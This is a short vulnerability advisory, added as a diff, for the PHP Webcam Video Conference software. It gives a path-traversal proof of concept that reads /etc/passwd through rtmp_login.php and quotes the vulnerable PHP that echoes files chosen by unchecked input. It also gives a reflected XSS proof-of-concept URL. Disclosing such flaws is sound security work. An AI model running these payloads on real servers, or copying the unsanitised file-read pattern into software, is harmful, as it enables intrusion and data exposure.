@@ -1,0 +1,35 @@
+# Exploit: PHP Webcam Video Conference - LFI/XSS
+# Date: 06/02/2014
+# Exploit Author: vinicius777
+# Contact: vinicius777 [AT] gmail / @vinicius777_
+# Vendor Homepage: http://www.videowhisper.com/
+# Software Link: http://sourceforge.net/projects/phpwebcamvideoconference
+# Solution: Upgrade from to the new version on videowhisper vendor homepage.
+
+
+
+
+[1] Local File Include - rtmp_login.php
+
+P0C: http://192.168.1.7/vc_php/rtmp_login.php?s=../../../../../etc/passwd
+
+[+] rtmp_rlogin.php
+
+$session = $_GET['s']; 
+
+$filename1 = "uploads/_sessions/$session"; 
+if (file_exists($filename1)) 
+{ 
+echo implode('', file($filename1)); 
+} 
+else 
+{ 
+echo "VideoWhisper=1&login=0"; 
+} 
+?>
+
+
+[2] XSS Reflected 
+
+P0C = http://192.168.1.7/vc_php/vc_logout.php?message=[XSS]
+
